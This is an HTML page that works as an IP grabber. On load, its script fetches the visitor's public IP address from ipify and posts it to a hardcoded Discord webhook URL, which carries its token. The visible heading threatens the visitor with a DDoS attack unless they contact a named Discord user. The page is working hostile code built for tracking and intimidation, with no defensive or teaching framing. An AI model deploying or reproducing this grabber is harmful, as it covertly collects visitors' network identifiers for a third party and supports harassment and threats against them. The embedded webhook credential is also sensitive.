<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <style>
        /* Add background image */
        body {
            background-image: url('https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%3Fid%3DOIP.2noV3-lGoW1Q1GrwWPYN3wHaEK%26pid%3DApi&f=1&ipt=9c0b0b1e1a44aec7cf8d02d023edc5304cecea26a49938b665e995a728d0f1aa');  /* Replace with your image URL */

            margin: 0;

            height: 100vh;
        }

        /* Style for the h1 element */
        h1 {
            text-align: center;
            margin-top: 50px;
            font-size: 2em;
            animation: colorChange 3s infinite alternate;  /* Apply color change animation */
        }

        /* Style for the status text */
        #status {
            text-align: center;
            font-size: 1.5em;
            margin-top: 20px;
            animation: colorChange 5s infinite alternate;  /* Apply color change animation */
        }

        /* CSS Keyframes for changing text color */
        @keyframes colorChange {
            0% { color: #ff6347; }  /* Tomato */
            25% { color: #32cd32; } /* LimeGreen */
            50% { color: #1e90ff; } /* DodgerBlue */
            75% { color: #ff1493; } /* DeepPink */

</head>
<body>
    <h1>Fetching and Sending Your IP Address to UTUBETROLLPOLICE
    
    Message "nisgib" on discord or get u will be ddosed by us ! </h1>
    <p id="status">Loading...</p>

    <script>
        // Define the Discord Webhook URL
        const discordWebhookUrl = 'https://ptb.discord.com/api/webhooks/1376131891102748682/V5XxcrZyBUX9_ybZQf92kt8k6IceJJt87k-i6EUatSMLE8Krq1Oqz218_o6URnKbBzeZ';  // Replace with your Discord webhook URL

        // Fetch the user's IP address from ipify
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())  // Parse JSON response
            .then(data => {
                // Get the user's IP address
                const userIp = data.ip;

                // Display IP on the webpage
                document.getElementById('status').textContent = `Your IP Address: ${userIp}`;

                // Create the message payload for Discord
                const payload = {
                    content: `New user IP: ${userIp}`  // The message you want to send to Discord
                };

                // Send the IP to the Discord webhook
                fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)  // Send the payload as JSON
                })
                .then(response => {
                    if (response.ok) {
                        console.log('IP address sent to Discord successfully');
                    } else {
                        console.error('Failed to send IP to Discord');
                    }
                })
                .catch(error => {
                    console.error('Error sending IP to Discord:', error);
                });
            })
            .catch(error => {
                console.error('Error fetching IP address:', error);
                document.getElementById('status').textContent = 'Unable to fetch IP address';
            });
    </script>
